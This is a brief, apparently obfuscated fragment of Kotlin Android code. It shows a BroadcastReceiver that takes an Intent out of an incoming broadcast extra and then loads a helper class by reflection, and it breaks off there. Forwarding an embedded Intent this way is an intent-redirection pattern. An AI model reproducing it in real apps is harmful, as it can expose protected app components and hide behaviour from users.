package com.river.flows.eastward.waves.ntywc.ntysr
...
@Keep
class YwcntMRecent: BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.hasExtra("In")) {
            val eIntent = intent.getParcelableExtra<Parcelable>("In") as Intent?
            if (eIntent != null) {
                try {
                    val helperClass = Class.forName("com.river.flows.eastward.waves.ntxac.YwcntMFan")
